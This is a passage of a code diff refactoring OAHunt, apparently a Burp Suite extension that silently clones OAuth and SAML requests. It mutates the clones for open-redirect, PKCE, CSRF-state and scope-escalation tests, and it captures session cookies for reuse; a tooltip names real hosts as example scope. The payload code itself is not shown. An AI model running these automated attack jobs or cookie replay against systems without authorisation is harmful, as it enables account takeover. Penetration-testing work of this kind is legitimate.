-            JOptionPane.showMessageDialog(
+            swing.JOptionPane.showMessageDialog(
                 None, "Saved: " + path, "Export OK",
-                JOptionPane.INFORMATION_MESSAGE)
+                swing.JOptionPane.INFORMATION_MESSAGE)
         except Exception as ex:
             self.ext._log("Export error: " + str(ex))
 
 
-class SaveSettingsAction(ActionListener):
-    def __init__(self, ext, scope_field, threads_field):
-        self.ext          = ext
-        self.scope_field  = scope_field
-        self.threads_field = threads_field
+class ASave(ActionListener):
+    def __init__(self, ext, sf, tf):
+        self.ext = ext
+        self.sf  = sf
+        self.tf  = tf
 
-    def actionPerformed(self, evt):
+    def actionPerformed(self, e):
         self.ext.scope_filter = [s.strip() for s in
-                                  self.scope_field.getText().split(",")
-                                  if s.strip()]
+                                  self.sf.getText().split(",") if s.strip()]
         try:
-            t = int(self.threads_field.getText().strip())
+            t = int(self.tf.getText().strip())
             if 1 <= t <= 20:
                 self.ext._pool_size = t
         except Exception:
             pass
-        self.ext._log("Settings saved. Scope: {} Threads: {}".format(
-            self.ext.scope_filter, self.ext._pool_size))
+        self.ext._log("Settings saved. Scope={}".format(self.ext.scope_filter))
 
 
-class FindingSelectListener(MouseAdapter):
-    def __init__(self, ext, table, detail):
+class ARowClick(MouseAdapter):
+    def __init__(self, ext, tbl, detail):
         self.ext    = ext
-        self.table  = table
+        self.tbl    = tbl
         self.detail = detail
 
-    def mouseClicked(self, evt):
-        row = self.table.getSelectedRow()
+    def mouseClicked(self, e):
+        row = self.tbl.getSelectedRow()
         if 0 <= row < len(self.ext.all_findings):
             f = self.ext.all_findings[row]
             self.detail.setText(
-                "CONFIRMED VULNERABILITY\n"
-                + "=" * 55 + "\n"
-                "Name:        {}\n"
-                "Severity:    {}\n"
-                "CWE:         {}\n"
-                "Host:        {}\n"
-                "Path:        {}\n"
-                "Time:        {}\n\n"
-                "PROOF OF EXPLOIT:\n"
-                "{}\n\n"
-                "NOTE: The confirmation request was sent as an\n"
-                "independent clone. Your browser session was\n"
-                "completely unaffected.\n"
+                "CONFIRMED VULNERABILITY\n" + "=" * 50 + "\n"
+                "Name:     {}\nSeverity: {}\nCWE:      {}\n"
+                "Host:     {}\nPath:     {}\nTime:     {}\n\n"
+                "PROOF OF EXPLOIT:\n{}\n\n"
+                "(Confirmed via independent cloned request.\n"
+                " Your browser session was NOT affected.)"
             ).format(
                 f["name"], f["severity"], f["cwe"],
                 f["host"], f["path"], f["timestamp"],
-                f["evidence"]
-            )
+                f["evidence"])
             self.detail.setCaretPosition(0)
 
 
-class ClearLogAction(ActionListener):
+class AClearLog(ActionListener):
     def __init__(self, area):
         self.area = area
 
-    def actionPerformed(self, evt):
+    def actionPerformed(self, e):
         self.area.setText("")
 
 
-# ── Main extension ────────────────────────────
+# ─────────────────────────────────────────────
+# UI HELPERS
+# ─────────────────────────────────────────────
+def mk_btn(txt, fg=C_TEXT):
+    b = swing.JButton(txt)
+    b.setFont(awt.Font("Monospaced", awt.Font.PLAIN, 11))
+    b.setBackground(C_SURFACE)
+    b.setForeground(fg)
+    b.setFocusPainted(False)
+    return b
+
+
+def mk_label(txt, fg=C_TEXT, bold=False):
+    l = swing.JLabel(txt)
+    style = awt.Font.BOLD if bold else awt.Font.PLAIN
+    l.setFont(awt.Font("Monospaced", style, 11))
+    l.setForeground(fg)
+    return l
+
+
+def mk_textarea():
+    a = swing.JTextArea()
+    a.setBackground(C_BG)
+    a.setForeground(C_TEXT)
+    a.setFont(awt.Font("Monospaced", awt.Font.PLAIN, 11))
+    a.setEditable(False)
+    a.setLineWrap(True)
+    a.setWrapStyleWord(True)
+    a.setBorder(swing.BorderFactory.createEmptyBorder(8, 10, 8, 10))
+    return a
+
+
+def mk_table(model):
+    t = swing.JTable(model)
+    t.setBackground(C_SURFACE)
+    t.setForeground(C_TEXT)
+    t.setGridColor(C_BORDER)
+    t.setSelectionBackground(C_ACCENT.darker())
+    t.setFont(awt.Font("Monospaced", awt.Font.PLAIN, 11))
+    t.getTableHeader().setBackground(C_BG)
+    t.getTableHeader().setForeground(C_ACCENT)
+    t.getTableHeader().setFont(awt.Font("Monospaced", awt.Font.BOLD, 11))
+    t.setRowHeight(22)
+    t.setAutoResizeMode(swing.JTable.AUTO_RESIZE_OFF)
+    return t
+
+
+# ─────────────────────────────────────────────
+# MAIN EXTENSION
+# ─────────────────────────────────────────────
 class BurpExtender(IBurpExtender, IHttpListener, ITab, IExtensionStateListener):
 
+    # ------------------------------------------------------------------
+    # registerExtenderCallbacks — may run on EDT in Burp 2026
+    # We build ALL Swing components here directly (no invokeLater/AndWait)
+    # because Swing components CAN be constructed on any thread as long as
+    # they haven't been shown yet. addSuiteTab shows the tab — so we must
+    # finish construction before calling it.
+    # ------------------------------------------------------------------
     def registerExtenderCallbacks(self, callbacks):
-        self._callbacks   = callbacks
-        self._helpers     = callbacks.getHelpers()
+        self._callbacks = callbacks
+        self._helpers   = callbacks.getHelpers()
         callbacks.setExtensionName("OAHunt")
-        callbacks.registerHttpListener(self)
-        callbacks.registerExtensionStateListener(self)
 
+        # State
         self.all_findings    = []
         self.tested          = set()
-        self.session_cookies = {}   # host -> {name: value}
+        self.session_cookies = {}
         self._active         = True
         self.scope_filter    = []
-        self._scan_count     = 0
+        self._scanned        = 0
         self._pool_size      = 4
-        self._queue          = None
 
-        # Thread pool — background attack jobs never touch proxy thread
-        self._executor = ThreadPoolExecutor(self._pool_size,
-                                             self._pool_size * 4,
-                                             60, TimeUnit.SECONDS,
-                                             LinkedBlockingQueue())
+        # Build all UI components synchronously right here
+        self._build_ui()
 
-        SwingUtilities.invokeLater(BuildUI(self))
+        # Thread pool (background attack jobs)
+        self._executor = ThreadPoolExecutor(
+            self._pool_size,
+            self._pool_size * 8,
+            60, TimeUnit.SECONDS,
+            LinkedBlockingQueue())
+
+        # Register after _main_panel is set
+        callbacks.registerHttpListener(self)
+        callbacks.registerExtensionStateListener(self)
         callbacks.addSuiteTab(self)
-        print("[OAHunt] Loaded. Browser flow unaffected. Cloning OAuth requests.")
 
+        print("[OAHunt] Loaded OK. Tab: OAHunt. Browser flow unaffected.")
+
+    # ------------------------------------------------------------------
+    # Build UI — called synchronously, sets self._main_panel
+    # ------------------------------------------------------------------
+    def _build_ui(self):
+        # ── Main panel ────────────────────────
+        main = swing.JPanel(awt.BorderLayout())
+        main.setBackground(C_BG)
+
+        # ── Header ────────────────────────────
+        hdr = swing.JPanel(awt.BorderLayout())
+        hdr.setBackground(C_SURFACE)
+        hdr.setBorder(swing.BorderFactory.createMatteBorder(
+            0, 0, 2, 0, C_ACCENT))
+
+        lft = swing.JPanel(awt.FlowLayout(awt.FlowLayout.LEFT, 10, 6))
+        lft.setBackground(C_SURFACE)
+
+        title = mk_label("OAHunt", C_ACCENT, True)
+        title.setFont(awt.Font("Monospaced", awt.Font.BOLD, 14))
+
+        toggle = swing.JToggleButton("ACTIVE — click to pause", True)
+        toggle.setFont(awt.Font("Monospaced", awt.Font.BOLD, 11))
+        toggle.setBackground(C_SURFACE)
+        toggle.setForeground(C_GREEN)
+        toggle.setFocusPainted(False)
+        toggle.addActionListener(AToggle(self, toggle))
+
+        lft.add(title)
+        lft.add(toggle)
+
+        rgt = swing.JPanel(awt.FlowLayout(awt.FlowLayout.RIGHT, 8, 6))
+        rgt.setBackground(C_SURFACE)
+
+        ctr = mk_label("  Scanned: 0  Findings: 0", C_MUTED)
+        self._ctr = ctr
+
+        clr_btn = mk_btn("Clear",  C_MUTED)
+        exp_btn = mk_btn("Export", C_GREEN)
+        clr_btn.addActionListener(AClear(self))
+        exp_btn.addActionListener(AExport(self))
+
+        rgt.add(ctr)
+        rgt.add(clr_btn)
+        rgt.add(exp_btn)
+
+        hdr.add(lft, awt.BorderLayout.WEST)
+        hdr.add(rgt, awt.BorderLayout.EAST)
+
+        # ── Tabs ──────────────────────────────
+        tabs = swing.JTabbedPane()
+        tabs.setBackground(C_SURFACE)
+        tabs.setForeground(C_TEXT)
+        tabs.setFont(awt.Font("Monospaced", awt.Font.BOLD, 11))
+        self._tabs = tabs
+
+        tabs.addTab("Findings (0)", self._tab_findings())
+        tabs.addTab("Settings",     self._tab_settings())
+        tabs.addTab("Log",          self._tab_log())
+
+        main.add(hdr,  awt.BorderLayout.NORTH)
+        main.add(tabs, awt.BorderLayout.CENTER)
+
+        # Set before addSuiteTab is called
+        self._main_panel = main
+
+    def _tab_findings(self):
+        p = swing.JPanel(awt.BorderLayout())
+        p.setBackground(C_BG)
+
+        cols  = ["Time", "Host", "Severity", "Vulnerability", "Path", "CWE"]
+        model = ROModel(cols, 0)
+        self._model = model
+
+        tbl  = mk_table(model)
+        rend = SevRenderer()
+        for i in range(len(cols)):
+            tbl.getColumnModel().getColumn(i).setCellRenderer(rend)
+        for i, w in enumerate([65, 170, 80, 310, 200, 80]):
+            tbl.getColumnModel().getColumn(i).setPreferredWidth(w)
+
+        detail = mk_textarea()
+        detail.setText(
+            "Select a finding to see the exploit proof.\n\n"
+            "Every finding was confirmed by sending an independent\n"
+            "cloned request. Your browser was never touched.")
+        tbl.addMouseListener(ARowClick(self, tbl, detail))
+
+        banner = mk_label(
+            "  All findings confirmed via independent cloned requests"
+            "  |  Browser flow NEVER modified",
+            C_GREEN, True)
+
+        split = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT,
+                                  swing.JScrollPane(tbl),
+                                  swing.JScrollPane(detail))
+        split.setResizeWeight(0.60)
+        split.setBackground(C_BG)
+
+        p.add(banner, awt.BorderLayout.NORTH)
+        p.add(split,  awt.BorderLayout.CENTER)
+        return p
+
+    def _tab_settings(self):
+        p   = swing.JPanel(awt.GridBagLayout())
+        p.setBackground(C_BG)
+        gbc = awt.GridBagConstraints()
+        gbc.insets = awt.Insets(10, 14, 10, 14)
+        gbc.fill   = awt.GridBagConstraints.HORIZONTAL
+
+        sf = swing.JTextField("", 38)
+        tf = swing.JTextField("4", 10)
+        for f in (sf, tf):
+            f.setBackground(C_SURFACE)
+            f.setForeground(C_TEXT)
+            f.setFont(awt.Font("Monospaced", awt.Font.PLAIN, 11))
+
+        save = mk_btn("Save Settings", C_GREEN)
+        save.addActionListener(ASave(self, sf, tf))
+
+        rows = [
+            ("Scope filter (comma hosts, blank=all):", sf),
+            ("Background threads (1-20):",             tf),
+        ]
+        for i, (ltxt, w) in enumerate(rows):
+            gbc.gridx, gbc.gridy, gbc.weightx = 0, i, 0
+            lbl = mk_label(ltxt, C_ACCENT, True)
+            p.add(lbl, gbc)
+            gbc.gridx, gbc.weightx = 1, 1.0
+            p.add(w, gbc)
+
+        gbc.gridx, gbc.gridy, gbc.weightx = 1, len(rows), 0
+        p.add(save, gbc)
+
+        info = mk_textarea()
+        info.setEditable(False)
+        info.setForeground(C_MUTED)
+        info.setText(
+            "\nOAHunt v3.2 — Authorize-style OAuth Scanner\n\n"
+            "Your browser proxy flow is NEVER modified.\n"
+            "OAuth requests are silently cloned into a background\n"
+            "thread pool. Each clone is mutated with one payload\n"
+            "and sent independently via makeHttpRequest().\n"
+            "Only confirmed exploits appear in Findings.\n\n"
+            "Checks:\n"
+            "  - Open redirect (all redirect-like params)\n"
+            "  - redirect_uri prefix match bypass\n"
+            "  - State/CSRF replay\n"
+            "  - PKCE bypass\n"
+            "  - Scope escalation\n"
+            "  - Post-auth redirect param injection\n"
+            "  - g2g interceptor cookie bypass\n"
+            "  - SAML RelayState redirect\n"
+            "  - Auth cookie missing flags\n\n"
+            "Confirmation requests show in Burp Proxy history\n"
+            "with User-Agent: OAuthHunter\n\n"
+            "Export path: /tmp/oauthhunter_confirmed.json\n"
+        )
+        gbc.gridx, gbc.gridy      = 0, len(rows) + 1
+        gbc.gridwidth, gbc.weightx = 2, 1.0
+        gbc.weighty, gbc.fill      = 1.0, awt.GridBagConstraints.BOTH
+        p.add(swing.JScrollPane(info), gbc)
+        return p
+
+    def _tab_log(self):
+        p = swing.JPanel(awt.BorderLayout())
+        p.setBackground(C_BG)
+
+        area = swing.JTextArea()
+        area.setBackground(C_BG)
+        area.setForeground(C_MUTED)
+        area.setFont(awt.Font("Monospaced", awt.Font.PLAIN, 10))
+        area.setEditable(False)
+        area.setBorder(swing.BorderFactory.createEmptyBorder(6, 8, 6, 8))
+        self._log_area = area
+
+        clr = mk_btn("Clear Log", C_MUTED)
+        clr.addActionListener(AClearLog(area))
+
+        p.add(swing.JScrollPane(area), awt.BorderLayout.CENTER)
+        p.add(clr,                     awt.BorderLayout.SOUTH)
+        return p
+
+    # ------------------------------------------------------------------
+    # ITab
+    # ------------------------------------------------------------------
     def getTabCaption(self):
         return "OAHunt"
 
     def getUiComponent(self):
         return self._main_panel
 
+    # ------------------------------------------------------------------
+    # IExtensionStateListener
+    # ------------------------------------------------------------------
     def extensionUnloaded(self):
         try:
             self._executor.shutdownNow()
@@ -760,431 +860,165 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab, IExtensionStateListener):
             pass
         print("[OAHunt] Unloaded.")
 
-    # ─────────────────────────────────────────
-    # HTTP LISTENER
-    # CRITICAL: this method must return FAST.
-    # We only read the request, queue jobs, and return.
-    # The browser never waits for our attack jobs.
-    # ─────────────────────────────────────────
+    # ------------------------------------------------------------------
+    # IHttpListener — MUST return immediately, never block proxy thread
+    # ------------------------------------------------------------------
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
         if not self._active:
             return
         try:
             if messageIsRequest:
-                self._queue_attack_jobs(messageInfo)
+                self._queue(messageInfo)
             else:
-                self._harvest_cookies(messageInfo)
+                self._harvest(messageInfo)
         except Exception:
             pass
-        # Always return immediately — never block the proxy thread
 
-    def _queue_attack_jobs(self, msg):
+    def _queue(self, msg):
         analyzed = self._helpers.analyzeRequest(msg)
         url      = analyzed.getUrl()
         host     = str(url.getHost())
         path     = str(url.getPath())
         params   = analyzed.getParameters()
 
-        # Scope filter
         if self.scope_filter:
             if not any(h in host for h in self.scope_filter):
                 return
 
-        # Only process OAuth/SAML traffic
-        param_map = {}
+        pm = {}
         for p in params:
-            param_map[str(p.getName())] = str(p.getValue())
+            pm[str(p.getName())] = str(p.getValue())
 
-        is_oauth = (any(k in param_map for k in OAUTH_PARAMS) or
+        is_oauth = (any(k in pm for k in OAUTH_PARAMS) or
                     any(seg in path for seg in OAUTH_PATHS))
         if not is_oauth:
             return
 
-        SwingUtilities.invokeLater(IncrementCounter(self))
-        self._log("Cloning: {} {}".format(str(analyzed.getMethod()), path))
+        self._scanned += 1
+        swing.SwingUtilities.invokeLater(RCounter(self))
+        self._log("Clone: {} {}{}".format(
+            str(analyzed.getMethod()), host, path))
 
-        cookies = dict(self.session_cookies.get(host, {}))
+        ck = dict(self.session_cookies.get(host, {}))
 
-        # Queue all applicable jobs — each runs independently in thread pool
-        # The original msg bytes are copied into each ClonedRequest
+        def submit(job):
+            try:
+                self._executor.execute(job)
+            except Exception:
+                pass
 
-        # 1. Open redirect on every redirect-like param
         for rp in REDIRECT_PARAMS:
-            if rp in param_map:
-                key = "or:{}:{}:{}".format(host, path, rp)
-                if key not in self.tested:
-                    self.tested.add(key)
-                    self._submit(JobOpenRedirect(
-                        self, msg, param_map, host, path, rp))
+            if rp in pm:
+                k = "or:{}:{}:{}".format(host, path, rp)
+                if k not in self.tested:
+                    self.tested.add(k)
+                    submit(JobOpenRedirect(self, msg, pm, host, path, rp))
 
-        # 2. Prefix bypass
-        if "redirect_uri" in param_map:
-            key = "pb:{}:{}".format(host, path)
-            if key not in self.tested:
-                self.tested.add(key)
-                self._submit(JobPrefixBypass(
-                    self, msg, param_map, host, path,
-                    param_map["redirect_uri"]))
+        if "redirect_uri" in pm:
+            k = "pb:{}:{}".format(host, path)
+            if k not in self.tested:
+                self.tested.add(k)
+                submit(JobPrefixBypass(
+                    self, msg, pm, host, path, pm["redirect_uri"]))
 
-        # 3. State CSRF
-        if "response_type" in param_map and "state" in param_map:
-            key = "csrf:{}:{}".format(host, path)
-            if key not in self.tested:
-                self.tested.add(key)
-                self._submit(JobStateCsrf(
-                    self, msg, param_map, host, path))
+        if "response_type" in pm and "state" in pm:
+            k = "csrf:{}:{}".format(host, path)
+            if k not in self.tested:
+                self.tested.add(k)
+                submit(JobStateCsrf(self, msg, pm, host, path))
 
-        # 4. PKCE bypass
-        if (param_map.get("response_type") == "code" and
-                "code_challenge" in param_map):
-            key = "pkce:{}:{}".format(host, path)
-            if key not in self.tested:
-                self.tested.add(key)
-                self._submit(JobPkceMissing(
-                    self, msg, param_map, host, path))
+        if pm.get("response_type") == "code" and "code_challenge" in pm:
+            k = "pkce:{}:{}".format(host, path)
+            if k not in self.tested:
+                self.tested.add(k)
+                submit(JobPkce(self, msg, pm, host, path))
 
-        # 5. Scope escalation
-        if "scope" in param_map and "response_type" in param_map:
-            key = "scope:{}:{}".format(host, path)
-            if key not in self.tested:
-                self.tested.add(key)
-                self._submit(JobScopeEscalation(
-                    self, msg, param_map, host, path))
+        if "scope" in pm and "response_type" in pm:
+            k = "scope:{}:{}".format(host, path)
+            if k not in self.tested:
+                self.tested.add(k)
+                submit(JobScope(self, msg, pm, host, path))
 
-        # 6. Post-auth redirect param injection
         for rp in ["returnTo", "return_to", "next", "goto",
                    "postLogin", "landingPage", "after_login"]:
-            if rp in param_map:
-                key = "ri:{}:{}:{}".format(host, path, rp)
-                if key not in self.tested:
-                    self.tested.add(key)
-                    self._submit(JobRedirectParamInjection(
-                        self, msg, param_map, host, path, rp))
+            if rp in pm:
+                k = "ri:{}:{}:{}".format(host, path, rp)
+                if k not in self.tested:
+                    self.tested.add(k)
+                    submit(JobRedirectInject(self, msg, pm, host, path, rp))
 
-        # 7. g2g bypass (when interceptor-style path seen with g2g cookies)
-        if (cookies and
-                any(k.lower() in ("g2g", "eg2g") for k in cookies.keys())):
-            key = "g2g:{}".format(host)
-            if key not in self.tested:
-                self.tested.add(key)
-                self._submit(JobG2gBypass(
-                    self, msg, param_map, host, path, cookies))
+        if ck and any(n.lower() in ("g2g", "eg2g") for n in ck.keys()):
+            k = "g2g:{}".format(host)
+            if k not in self.tested:
+                self.tested.add(k)
+                submit(JobG2g(self, msg, pm, host, path, ck))
 
-        # 8. SAML RelayState
-        if "RelayState" in param_map:
-            key = "rs:{}:{}".format(host, path)
-            if key not in self.tested:
-                self.tested.add(key)
-                self._submit(JobSamlRelayState(
-                    self, msg, param_map, host, path))
+        if "RelayState" in pm:
+            k = "rs:{}:{}".format(host, path)
+            if k not in self.tested:
+                self.tested.add(k)
+                submit(JobSaml(self, msg, pm, host, path))
 
-    def _harvest_cookies(self, msg):
-        """
-        Read Set-Cookie headers from responses to track session state.
-        Also check critical auth cookie flags here.
-        """
-        analyzed_req  = self._helpers.analyzeRequest(msg)
-        analyzed_resp = self._helpers.analyzeResponse(msg.getResponse())
-        host  = str(analyzed_req.getUrl().getHost())
-        path  = str(analyzed_req.getUrl().getPath())
+    def _harvest(self, msg):
+        ar_req  = self._helpers.analyzeRequest(msg)
+        ar_resp = self._helpers.analyzeResponse(msg.getResponse())
+        host    = str(ar_req.getUrl().getHost())
+        path    = str(ar_req.getUrl().getPath())
 
         if self.scope_filter:
             if not any(h in host for h in self.scope_filter):
                 return
 
-        for h in analyzed_resp.getHeaders():
+        CRIT = set(["auth0", "auth0_compat", "access_token",
+                    "id_token", "session", "sid", "token"])
+
+        for h in ar_resp.getHeaders():
             hs = str(h)
-            if hs.lower().startswith("set-cookie:"):
-                # Harvest cookie value
-                parts = hs[11:].strip()
-                if "=" in parts:
-                    name = parts.split("=")[0].strip()
-                    val  = parts.split("=")[1].split(";")[0].strip()
-                    if host not in self.session_cookies:
-                        self.session_cookies[host] = {}
-                    self.session_cookies[host][name] = val
+            if not hs.lower().startswith("set-cookie:"):
+                continue
+            parts = hs[11:].strip()
+            if "=" not in parts:
+                continue
+            name = parts.split("=")[0].strip()
+            val  = parts.split("=")[1].split(";")[0].strip()
+            if host not in self.session_cookies:
+                self.session_cookies[host] = {}
+            self.session_cookies[host][name] = val
 
-                # Check critical cookie flags (no HTTP request needed)
-                name_str, evidence = JobCookieFlags.check(hs)
-                if name_str:
-                    key = "cf:{}:{}".format(host, name_str)
-                    if key not in self.tested:
-                        self.tested.add(key)
-                        self._add_finding(host, path, msg,
-                            name_str, "LOW", "CWE-614", evidence)
+            if name.lower() in CRIT:
+                low     = parts.lower()
+                missing = []
+                if "httponly" not in low: missing.append("HttpOnly")
+                if "secure"   not in low: missing.append("Secure")
+                if "samesite" not in low: missing.append("SameSite")
+                if missing:
+                    ck = "cf:{}:{}".format(host, name)
+                    if ck not in self.tested:
+                        self.tested.add(ck)
+                        self._add_finding(
+                            host, path, msg,
+                            "Cookie '{}' Missing Flags".format(name),
+                            "LOW", "CWE-614",
+                            "Missing: {}".format(", ".join(missing)))
 
-    def _submit(self, job):
-        try:
-            self._executor.execute(job)
-        except Exception as ex:
-            self._log("Submit error: " + str(ex))
-
-    def _add_finding(self, host, path, msg, name, severity, cwe, evidence):
-        # Deduplicate by name+host+path
+    def _add_finding(self, host, path, msg, name, sev, cwe, evidence):
         for f in self.all_findings:
-            if (f["name"] == name and
-                    f["host"] == host and
-                    f["path"] == path):
+            if f["name"] == name and f["host"] == host and f["path"] == path:
                 return
-        finding = {
+        f = {
             "host":        host,
             "path":        path,
             "name":        name,
-            "severity":    severity,
+            "severity":    sev,
             "cwe":         cwe,
             "evidence":    evidence,
             "timestamp":   time.strftime("%H:%M:%S"),
             "messageInfo": msg,
         }
-        self.all_findings.append(finding)
-        self._log("[CONFIRMED][{}] {} on {}{}".format(
-            severity, name, host, path))
-        SwingUtilities.invokeLater(AddFindingRow(self, finding))
+        self.all_findings.append(f)
+        self._log("[CONFIRMED][{}] {} @ {}{}".format(sev, name, host, path))
+        swing.SwingUtilities.invokeLater(RAddRow(self, f))
 
     def _log(self, msg):
         line = "[{}] {}\n".format(time.strftime("%H:%M:%S"), str(msg))
-        SwingUtilities.invokeLater(AppendLog(self, line))
-
-
-# ── UI ────────────────────────────────────────
-class BuildUI(Runnable):
-    def __init__(self, ext):
-        self.ext = ext
-
-    def run(self):
-        e    = self.ext
-        main = JPanel(BorderLayout())
-        main.setBackground(C_BG)
-        e._main_panel = main
-
-        tabs = JTabbedPane()
-        tabs.setBackground(C_SURFACE)
-        tabs.setForeground(C_TEXT)
-        tabs.setFont(Font("Monospaced", Font.BOLD, 12))
-        e._tabs = tabs
-
-        tabs.addTab("Findings (0)", self._findings_tab())
-        tabs.addTab("Settings",     self._settings_tab())
-        tabs.addTab("Log",          self._log_tab())
-
-        main.add(self._header(), BorderLayout.NORTH)
-        main.add(tabs,           BorderLayout.CENTER)
-
-    def _header(self):
-        e = self.ext
-        p = JPanel(BorderLayout())
-        p.setBackground(C_SURFACE)
-        p.setBorder(BorderFactory.createMatteBorder(0, 0, 2, 0, C_ACCENT))
-
-        left = JPanel(FlowLayout(FlowLayout.LEFT, 10, 6))
-        left.setBackground(C_SURFACE)
-
-        title = JLabel("OAHunt")
-        title.setFont(Font("Monospaced", Font.BOLD, 14))
-        title.setForeground(C_ACCENT)
-
-        # Big toggle button — like Authorize extension
-        toggle = JToggleButton("ON  - Click to Disable", True)
-        toggle.setFont(Font("Monospaced", Font.BOLD, 12))
-        toggle.setBackground(C_SURFACE)
-        toggle.setForeground(C_GREEN)
-        toggle.setFocusPainted(False)
-        toggle.addActionListener(ToggleAction(e, toggle))
-
-        status_lbl = JLabel("Status: ACTIVE — cloning OAuth flows")
-        status_lbl.setFont(Font("Monospaced", Font.PLAIN, 11))
-        status_lbl.setForeground(C_GREEN)
-        e._status_lbl = status_lbl
-
-        left.add(title)
-        left.add(toggle)
-        left.add(status_lbl)
-
-        right = JPanel(FlowLayout(FlowLayout.RIGHT, 6, 6))
-        right.setBackground(C_SURFACE)
-
-        counter_lbl = JLabel(
-            "  Requests scanned: 0  |  Findings: 0  |  Queue: 0")
-        counter_lbl.setFont(Font("Monospaced", Font.PLAIN, 10))
-        counter_lbl.setForeground(C_MUTED)
-        e._counter_lbl = counter_lbl
-
-        clear_btn  = self._btn("Clear",  C_MUTED)
-        export_btn = self._btn("Export", C_GREEN)
-        clear_btn.addActionListener(ClearAction(e))
-        export_btn.addActionListener(ExportAction(e))
-
-        right.add(counter_lbl)
-        right.add(clear_btn)
-        right.add(export_btn)
-
-        p.add(left,  BorderLayout.WEST)
-        p.add(right, BorderLayout.EAST)
-        return p
-
-    def _findings_tab(self):
-        e = self.ext
-        p = JPanel(BorderLayout())
-        p.setBackground(C_BG)
-
-        cols  = ["Time", "Host", "Severity", "Vulnerability", "Path", "CWE"]
-        model = ReadOnlyTableModel(cols, 0)
-        e._findings_model = model
-
-        table = self._table(model)
-        sev_r = SeverityRenderer()
-        for i in range(len(cols)):
-            table.getColumnModel().getColumn(i).setCellRenderer(sev_r)
-        for i, w in enumerate([65, 170, 80, 300, 200, 80]):
-            table.getColumnModel().getColumn(i).setPreferredWidth(w)
-
-        detail = self._textarea()
-        detail.setText(
-            "Select a finding above to see the exploit proof.\n\n"
-            "Every finding was confirmed by sending an independent cloned\n"
-            "request. Your browser session was never touched."
-        )
-        table.addMouseListener(FindingSelectListener(e, table, detail))
-
-        banner = JLabel(
-            "  All findings confirmed via independent cloned requests  "
-            "|  Browser/proxy flow is NEVER modified")
-        banner.setFont(Font("Monospaced", Font.BOLD, 11))
-        banner.setForeground(C_GREEN)
-
-        split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
-                           JScrollPane(table), JScrollPane(detail))
-        split.setResizeWeight(0.6)
-        split.setBackground(C_BG)
-
-        p.add(banner, BorderLayout.NORTH)
-        p.add(split,  BorderLayout.CENTER)
-        return p
-
-    def _settings_tab(self):
-        e = self.ext
-        p = JPanel(GridBagLayout())
-        p.setBackground(C_BG)
-        gbc        = GridBagConstraints()
-        gbc.insets = Insets(10, 14, 10, 14)
-        gbc.fill   = GridBagConstraints.HORIZONTAL
-
-        scope_field = JTextField("", 40)
-        scope_field.setBackground(C_SURFACE)
-        scope_field.setForeground(C_TEXT)
-        scope_field.setFont(Font("Monospaced", Font.PLAIN, 11))
-        scope_field.setToolTipText(
-            "Leave blank for all hosts. E.g.: airmiles.ca,oauth-int.airmiles.ca")
-
-        threads_field = JTextField("4", 10)
-        threads_field.setBackground(C_SURFACE)
-        threads_field.setForeground(C_TEXT)
-        threads_field.setFont(Font("Monospaced", Font.PLAIN, 11))
-
-        save_btn = self._btn("Save Settings", C_GREEN)
-        save_btn.addActionListener(
-            SaveSettingsAction(e, scope_field, threads_field))
-
-        rows = [
-            ("Scope filter (comma-sep hosts, blank=all):", scope_field),
-            ("Background threads (1-20):", threads_field),
-        ]
-        for i, (lbl_txt, widget) in enumerate(rows):
-            gbc.gridx, gbc.gridy, gbc.weightx = 0, i, 0
-            lbl = JLabel(lbl_txt)
-            lbl.setFont(Font("Monospaced", Font.BOLD, 11))
-            lbl.setForeground(C_ACCENT)
-            p.add(lbl, gbc)
-            gbc.gridx, gbc.weightx = 1, 1.0
-            p.add(widget, gbc)
-
-        gbc.gridx, gbc.gridy, gbc.weightx = 1, len(rows), 0
-        p.add(save_btn, gbc)
-
-        info = self._textarea()
-        info.setEditable(False)
-        info.setForeground(C_MUTED)
-        info.setText(
-            "\nOAHunt v3 — How It Works\n\n"
-            "Design: Like the Authorize extension.\n\n"
-            "  1. Your browser request flows through Burp proxy NORMALLY.\n"
-            "     Nothing is modified, nothing restarts.\n\n"
-            "  2. OAHunt silently clones each OAuth/SAML request.\n"
-            "     Clones are byte-copies — independent of the browser session.\n\n"
-            "  3. Attack jobs run in a background thread pool.\n"
-            "     Each job mutates its own clone with one payload and sends\n"
-            "     it via makeHttpRequest() — totally separate from your browser.\n\n"
-            "  4. If a response CONFIRMS exploitation, the finding is reported.\n"
-            "     No guessing. No pattern matching. Real proof only.\n\n"
-            "Checks performed (all confirmed by response):\n"
-            "  - Open redirect (all redirect-like params)\n"
-            "  - redirect_uri prefix match bypass (Auth0 style)\n"
-            "  - State/CSRF - replays without state, confirms server accepts\n"
-            "  - PKCE bypass - strips code_challenge, confirms code issued\n"
-            "  - Scope escalation - elevated scope confirmed by server\n"
-            "  - Post-auth redirect param injection (returnTo, next, goto...)\n"
-            "  - g2g/interceptor cookie bypass\n"
-            "  - SAML RelayState open redirect\n"
-            "  - Auth cookie missing security flags\n\n"
-            "All confirmation requests appear in Burp Proxy history\n"
-            "with User-Agent containing 'OAuthHunter'.\n\n"
-            "Export: /tmp/oauthhunter_confirmed.json\n"
-        )
-        gbc.gridx, gbc.gridy      = 0, len(rows) + 1
-        gbc.gridwidth, gbc.weightx = 2, 1.0
-        gbc.weighty, gbc.fill      = 1.0, GridBagConstraints.BOTH
-        p.add(JScrollPane(info), gbc)
-        return p
-
-    def _log_tab(self):
-        e = self.ext
-        p = JPanel(BorderLayout())
-        p.setBackground(C_BG)
-
-        area = JTextArea()
-        area.setBackground(C_BG)
-        area.setForeground(C_MUTED)
-        area.setFont(Font("Monospaced", Font.PLAIN, 10))
-        area.setEditable(False)
-        area.setBorder(BorderFactory.createEmptyBorder(6, 8, 6, 8))
-        e._log_area = area
-
-        clear_btn = self._btn("Clear Log", C_MUTED)
-        clear_btn.addActionListener(ClearLogAction(area))
-
-        p.add(JScrollPane(area), BorderLayout.CENTER)
-        p.add(clear_btn,         BorderLayout.SOUTH)
-        return p
-
-    def _btn(self, txt, fg=C_TEXT):
-        b = JButton(txt)
-        b.setFont(Font("Monospaced", Font.PLAIN, 11))
-        b.setBackground(C_SURFACE)
-        b.setForeground(fg)
-        b.setFocusPainted(False)
-        return b
-
-    def _table(self, model):
-        t = JTable(model)
-        t.setBackground(C_SURFACE)
-        t.setForeground(C_TEXT)
-        t.setGridColor(C_BORDER)
-        t.setSelectionBackground(C_ACCENT.darker())
